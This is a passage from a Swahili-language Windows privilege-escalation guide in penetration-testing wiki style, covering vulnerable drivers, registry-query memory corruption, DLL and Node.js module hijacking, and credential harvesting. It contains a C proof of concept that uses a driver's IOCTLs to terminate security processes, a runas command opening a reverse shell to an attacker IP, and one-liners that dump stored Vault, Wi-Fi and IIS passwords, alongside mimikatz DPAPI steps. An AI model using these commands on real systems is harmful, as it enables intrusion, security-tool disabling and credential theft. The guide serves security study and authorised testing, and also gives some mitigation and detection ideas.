Baadhi ya drivers hukubali registry path kutoka userland, huthibitisha tu kwamba ni string halali ya UTF-16, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa `RTL_QUERY_REGISTRY_DIRECT` ndani ya scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na aina **halisi** ya registry, wala si aina ambayo developer alitarajia.

Hii hutengeneza primitives mbili muhimu:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path kamili ya `\Registry\...` inayodhibitiwa na mtumiaji huiruhusu driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua uwepo wake kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kuzifikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` hutafsiriwa kimakosa kama `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea aina ya registry value.

Maelezo ya vitendo ya exploitation:

- **Mitigation ya Windows 8+**: query ikigusa **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili kudumisha uwezekano wa exploitation, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya system hives zinazoaminika** badala ya kuweka values chini ya `HKCU`.
- **Uwekaji wa values kwenye trusted hive**: tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikwa za `\Registry\Machine`, kisha rudia uchanganuzi huo kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazofikika kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: write ya moja kwa moja ya baiti 8 kwenye `int` ya baiti 4 huharibu data ya stack iliyo karibu na inaweza kubatilisha kwa sehemu callback/function pointer iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ionyeshe `UNICODE_STRING`. Ikiwa code kwanza inapakia `REG_DWORD` inayodhibitiwa na attacker kwenye scalar ya stack na kisha kutumia tena buffer hiyo hiyo kwa usomaji wa string, attacker hudhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, na hivyo kusababisha kernel write inayodhibitiwa kwa kiwango fulani.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani **hasi** inayodhibitiwa na attacker kwenye scalar inayotumiwa tena, swali linalofuata la `REG_BINARY` hunakili baiti za attacker moja kwa moja juu ya nafasi za stack zilizo karibu, jambo ambalo mara nyingi ndiyo njia rahisi zaidi ya kubatilisha callback-pointer kikamilifu.

Mchoro madhubuti wa kutafuta: **usomaji wa registry wa aina tofauti kwenye variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na code paths ambako usomaji wa kwanza wa registry huamua kama usomaji wa pili utafanyika.

#### Kutumia vibaya kutokuwepo kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party drivers zilizotiwa saini huunda device object yao kwa kutumia SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, secure DACL haitatekelezwa kifaa kinapofunguliwa kupitia path yenye component ya ziada, hivyo mtumiaji yeyote asiye na privilege anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji anapoweza kufungua device, IOCTL zenye privilege kubwa zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Uwezo ulioonekana kwenye matukio halisi:
- Kurudisha handles zenye ufikiaji kamili kwa processes zozote (wizi wa token / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Usomaji/uandikaji wa raw disk usio na vizuizi (tampering offline, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, zikiwemo Protected Process/Light (PP/PPL), na kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa operations zenye privileges. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejeshwa kwa handles.
- Weka vikwazo kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na uzingatie modeli za broker badala ya privileges za moja kwa moja za kernel.

Mawazo ya detection kwa defenders
- Fuatilia ufunguzi kutoka user-mode wa majina ya device yanayotiliwa shaka (kwa mfano, \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza orodha ya Microsoft ya madereva hatarishi yaliyozuiwa (HVCI/WDAC/Smart App Control) na udumishe orodha zako za kuruhusu/kukataa.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folder iliyo kwenye PATH** unaweza kuwa na uwezo wa kuteka nyara DLL inayopakiwa na process na **kuongeza privileges**.<sup>[[2]](#references)</sup>

Kagua ruhusa za folders zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekwaji wa utatuzi wa module za Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapotumia import isiyo na path, kama `require("foo")`, na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta packages kwa kupanda kwenye mti wa directory na kuangalia folda za `node_modules` kwenye kila parent. Kwenye Windows, utafutaji huo unaweza kufika kwenye root ya drive, kwa hivyo programu inayoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kupata:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye ruhusa za chini** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye ruhusa za juu** ujaribu kutatua dependency inayokosekana. Payload huendeshwa katika muktadha wa usalama wa mchakato wa mwathiriwa, kwa hivyo hali hii huwa **LPE** kila mara target inapoendeshwa kama administrator, kupitia scheduled task/service wrapper iliyoinuliwa ruhusa, au kupitia programu ya desktop yenye ruhusa za juu inayojiendesha kiotomatiki.

Hili hutokea mara nyingi hasa wakati:

- dependency imetangazwa kwenye `optionalDependencies`<sup>[[22]](#references)</sup>
- third-party library inaweka `require("foo")` ndani ya `try/catch` na kuendelea ikiwa itashindwa
- package imeondolewa kwenye production builds, imeachwa wakati wa packaging, au imeshindwa kusakinishwa
- `require()` iliyo hatarini iko ndani zaidi kwenye dependency tree badala ya kuwa kwenye code kuu ya programu

### Kutafuta targets zilizo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Weka kichujio cha `Process Name` = executable lengwa (`node.exe`, EXE ya programu ya Electron, au wrapper process)
- Weka kichujio cha `Path` `contains` `node_modules`
- Zingatia `NAME NOT FOUND` na jaribio la mwisho lililofanikiwa la kufungua chini ya `C:\node_modules`

Mifumo muhimu ya kukagua code kwenye faili za `.asar` zilizofunguliwa au source za programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kutoka Procmon au kupitia ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Anzisha programu ya mwathiriwa. Ikiwa programu itajaribu `require("foo")` na moduli halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano halisi ya moduli za hiari zinazokosekana zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **mbinu** ndiyo inayoweza kutumika tena: tafuta **bare import yoyote inayokosekana** ambayo mchakato wa Windows Node/Electron wenye ruhusa za juu utaazimia.

### Mawazo ya kugundua na kuimarisha usalama

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/pa kifurushi kipya cha `.js` humo.
- Tafuta michakato yenye uadilifu wa juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha utegemezi wote wa runtime katika mazingira ya production na kagua matumizi ya `optionalDependencies`.
- Kagua msimbo wa watu wengine ili kubaini mifumo ya kimyakimya ya `try { require("...") } catch {}`.
- Zima ukaguzi wa hiari ikiwa maktaba inatoa chaguo hilo (kwa mfano, baadhi ya matumizi ya `ws` yanaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Hifadhi za pamoja

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### faili la hosts

Angalia kompyuta nyingine zinazojulikana ambazo zimewekwa moja kwa moja kwenye faili la hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Miingiliano ya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Milango Wazi

Angalia **huduma zilizozuiwa** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa ufikiaji kama user wa desktop yake ikiwa uthibitishaji wake na vidhibiti vya amri vinaruhusu. Application maalum ya TCP inayoendeshwa chini ya akaunti yenye ruhusa za juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni viashiria vya awali tu, huku njia ya authenticated memory-corruption ikihitaji uchanganuzi wa binary hiyo mahususi na input inayoweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubainisha service ya backend; forwarding rule pekee haithibitishi kuwa destination inaweza kufikiwa au ina udhaifu.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Kanuni za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(kuorodhesha kanuni, kuunda kanuni, kuzima, kuzima...)**

[Amri zaidi za kuhesabu mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, utaulizwa kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa `root` wa Linux ndani ya WSL hakukupi moja kwa moja haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa usambazaji, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) ili kuona amri ambazo huenda zilirekodi credentials; kupata haki za juu zaidi bado kunahitaji akaunti halali yenye haki hizo na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` unatumika kwa usakinishaji wa zamani wa WSL; WSL 2 mara nyingi huhifadhi usambazaji kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hivyo tambua kwanza usambazaji halisi na njia ya hifadhi. Epuka kuchapisha yaliyomo kwenye historia wakati wa ukaguzi wa kiotomatiki.

## Hati tambulisho za Windows

### Hati tambulisho za Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni ugunduzi wa plaintext kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna password ya plaintext inayosomeka, hiyo ni dalili tu ya kufuatilia: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauwezi kuthibitisha kama secret hiyo ipo au inaweza kupatikana. Kagua ruhusa za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kuvuja kwa credential.

### Kidhibiti cha credentials / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa ajili ya seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingia watumiaji kiotomatiki**. Mwanzoni, huenda ikaonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na vivinjari viingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii inamaanisha kwamba **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, na kutumia credentials zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na password kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` kwa seti ya credentials iliyotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au moduli ya [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na manenosiri ya maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (ambayo pia huonekana kama `Web Credentials` katika `vaultcmd`). Eneo hili la hifadhi hutenganishwa kwa kila session na linaweza kusimbuliwa kwa njia asilia bila haki za msimamizi au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session inayotumika ya mtumiaji ili kumwaga na kusimbua papo hapo majina yote ya watumiaji na manenosiri yote yaliyohifadhiwa ya maandishi wazi:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya kufanya usimbaji fiche wa data kwa kutumia ufunguo wa siri, ambayo hutumika zaidi ndani ya mfumo wa uendeshaji wa Windows kwa usimbaji fiche wa funguo za faragha zisizo linganifu kwa kutumia ufunguo wa siri. Usimbaji fiche huu hutumia siri ya mtumiaji au ya mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kwa kutumia ufunguo wa siri unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa kikoa za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` huwakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, ambao uko pamoja na ufunguo mkuu unaolinda funguo za faragha za mtumiaji katika faili hiyo hiyo**, kwa kawaida huwa na data nasibu yenye urefu wa baiti 64. (Ni muhimu kutambua kuwa ufikiaji wa saraka hii umewekewa vikwazo, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) ili kuisimbua.

**Faili za credentials zinazolindwa na master password** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa DPAPI** **masterkeys** nyingi kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** hutumiwa mara nyingi kwa ajili ya kazi za **scripting** na automation, kama njia rahisi ya kuhifadhi credentials zilizosimbwa. Credentials hizi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kwamba zinaweza kusimbuliwa tu na mtumiaji yuleyule kwenye kompyuta ileile zilipoundwa.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Ikiwa script au orodha ya faili inaonyesha faili kama hiyo, tafuta saraka halisi ya profile ya akaunti badala ya kudhani kuwa ni `C:\Users`: [Windows inaweza kuweka profiles mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` hufungamanisha credential iliyosimbwa na mtumiaji na kompyuta iliyoi-export](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima pia iwe na ruhusa halali kwenye service inayolengwa. Kagua njia na ACL kwanza, bila kuonyesha thamani zilizosimbwa au maandishi wazi wakati wa uchunguzi wa kawaida.

Ili **kusimbua** credentials za PS kutoka kwenye faili iliyo nazo, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho cha Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kudekripta faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na attributes za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kama kidokezo cha credential. Thamani iliyohifadhiwa si password ya DPAPI/RDCMan; uirejeshe kunategemea mipangilio ya usimbaji fiche ya faili na iwapo password maalum ya master ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa kufanya enumeration ya jumla.

**Remote Desktop Plus profile exports** zinaweza pia kusomeka kwenye directories za mtumiaji au folda ya pamoja ya usimamizi. Export ya zamani ya `profiles.xml` ina entries za `Data/Profile` zilizo na vipengele vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengele cha password kisicho tupu kama kidokezo cha credential, bila kukichapisha au kudhani kuwa kiko wazi: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profile unaweza kuhusishwa na akaunti na kompyuta iliyoiunda, au kusanidiwa kwa masharti yasiyo makali sana. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Mara nyingi watu hutumia programu ya Sticky Notes kwenye workstation za Windows **kuhifadhi password** na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na inafaa kutafutwa na kuchunguzwa kila mara.

Wakati mwingine watu huhifadhi password na taarifa nyingine kwenye programu za sticky-note. Programu ya Sticky Notes ya Microsoft iliyofungashwa kwa kawaida huhifadhi noti kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za profile ya mtumiaji, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na muundo wa hifadhi kabla ya kuchukulia kutokuwepo kwa faili ya SQLite kama ushahidi kwamba hakuna noti.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa noti za hivi karibuni zilizowekwa. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya database, na ujumuishe `plum.sqlite-shm` inapopatikana; index ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya database. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Noti iliyo na jina la akaunti au password ni kidokezo cha credential tu: thibitisha akaunti, ruhusa ya kufikia, na matumizi ya password hiyo tena kando. Rekodi iliyosimbwa ya password-manager pia inahitaji ufunguo wake halisi wa decryption na tafsiri mahususi ya programu kabla ya kuthibitisha kuingia kwenye akaunti yenye ruhusa za juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha password kutoka AppCmd.exe unahitaji kuwa Administrator na kuiendesha katika kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye directory ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, basi inawezekana kuwa baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Code hii ilitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
